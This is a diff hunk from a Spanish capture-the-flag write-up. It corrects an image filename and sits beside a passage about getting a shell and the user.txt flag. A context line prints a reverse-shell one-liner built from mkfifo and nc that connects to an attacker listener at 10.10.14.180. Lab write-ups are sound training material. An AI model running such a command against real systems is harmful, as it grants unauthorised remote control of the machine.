@@ -90,7 +90,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/ -i 2>&1|nc 10.10.14.180 1234 >/tmp/f
 
 En mi caso he usado penelope para obtener la shell full interactiva, ya tenemos acceso y podremos acceder a la primera flag user.txt
 
-![Rev_Shell1.png](Rev_shell1.png)
+![Rev_Shell1.png](Rev_Shell1.png)
 
 
 ![UserTXT.png](UserTXT.png)
